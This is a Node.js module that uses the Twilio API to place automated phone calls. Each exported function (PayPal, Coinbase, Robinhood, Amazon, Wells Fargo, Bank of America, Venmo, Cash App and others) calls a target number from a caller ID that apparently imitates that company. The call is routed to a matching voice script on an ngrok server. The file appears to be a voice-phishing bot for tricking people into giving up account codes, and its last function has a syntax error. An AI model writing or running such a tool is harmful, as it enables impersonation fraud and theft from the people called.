require("dotenv").config()
const accountSid = process.env.TWILIO_ACCOUNT_SID;
const authToken = process.env.TWILIO_AUTH_TOKEN;
const client = require('twilio')(accountSid, authToken);
const EventEmitter = require("events").EventEmitter;
const ev = new EventEmitter();
const url = process.env.NGROK_URL;

module.exports.paypal = async(number) => {
    return new Promise((resolve, reject) => {
        client.calls.create({
            "url": `${url}/voice`,
            "to": number,
            "from": "+18882211161"
        }).then(call => {
            if(call) {
                resolve(call)
            } else {
                reject()
            }
        })
    })
}

module.exports.coinbase = async(number, message) => {
    return new Promise((resolve, reject) => {
        client.calls.create({
            "url": `${url}/coinbase`,
            "to": number,
            "from": "+18889087930"
        }).then(call => {
            if(call) {
                resolve(call)
            } else {
                reject()
            }
        })
    })
}

module.exports.quadpay = async(number, message) => {
    return new Promise((resolve, reject) => {
        client.calls.create({
            "url": `${url}/quadpay`,
            "to": number,
            "from": "+18882743159"
        }).then(call => {
            if(call) {
                resolve(call)
            } else {
                reject()
            }
        })
    })
}

module.exports.robinhood = async(number, message) => {
    return new Promise((resolve, reject) => {
        client.calls.create({
            "url": `${url}/robinhood`,
            "to": number,
            "from": "+16507617789"
        }).then(call => {
            if(call) {
                resolve(call)
            } else {
                reject()
            }
        })
    })
}

module.exports.amazon = async(number, message) => {
    return new Promise((resolve, reject) => {
        client.calls.create({
            "url": `${url}/amazon`,
            "to": number,
            "from": "+18882804331"
        }).then(call => {
            if(call) {
                resolve(call)
            } else {
                reject()
            }
        })
    })
}

module.exports.wellsfargo = async(number, message) => {
    return new Promise((resolve, reject) => {
        client.calls.create({
            "url": `${url}/wellsfargo`,
            "to": number,
            "from": "+18008693557"
        }).then(call => {
            if(call) {
                resolve(call)
            } else {
                reject()
            }
        })
    })
}

module.exports.boa = async(number, message) => {
    return new Promise((resolve, reject) => {
        client.calls.create({
            "url": `${url}/boa`,
            "to": number,
            "from": "+18004321000"
        }).then(call => {
            if(call) {
                resolve(call)
            } else {
                reject()
            }
        })
    })
}

module.exports.venmo = async(number, message) => {
    return new Promise((resolve, reject) => {
        client.calls.create({
            "url": `${url}/venmo`,
            "to": number,
            "from": "+18558124430"
        }).then(call => {
            if(call) {
                resolve(call)
            } else {
                reject()
            }
        })
    })
}

module.exports.cashapp = async(number, message) => {
    return new Promise((resolve, reject) => {
        client.calls.create({
            "url": `${url}/cashapp`,
            "to": number,
            "from": +18009691940"
        }).then(call => {
            if(call) {
                resolve(call)
            } else {
                reject()
            }
        })
    })
}

module.exports.ev = ev;
